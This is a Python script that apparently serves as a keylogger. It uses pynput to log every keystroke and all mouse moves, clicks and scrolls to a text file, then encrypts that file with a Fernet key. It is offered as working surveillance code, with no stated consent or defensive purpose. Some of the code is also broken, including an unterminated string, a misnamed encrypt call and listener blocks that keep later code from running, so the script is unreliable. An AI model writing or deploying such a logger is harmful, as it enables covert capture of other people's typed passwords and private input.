from pynput.mouse import Listener
from pynput import keyboard
import os
from cryptography.fernet import Fernet
import logging
import time






logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))



def on_press(key):
    try:
        logging.info('{0}'.format(
            key.char))
    except AttributeError:
        logging.info('special key {0} pressed'.format(
            key))
        
'''      
def on_release(key):
    logging.info('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
'''


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        ) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
  )
listener.start()

with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll,on_press=on_press) as listener:
    listener.join()

        

        
        
        
        
        
time.sleep(100) # Sleep for 100 seconds







key = Fernet.generate_key()

#Make A Key
if not os.path.exists('mykey.key'):
    with open('mykey.key', 'wb') as mykey:
        mykey.write(key)

with open('mykey.key', 'rb') as mykey:
    key = mykey.read()

the_file = 'mouse_log.txt
#Encrypting
def Encrypt():


    f = Fernet(key)

    with open(the_file, 'rb') as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)

    with open(the_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

while True:
    encrypt():
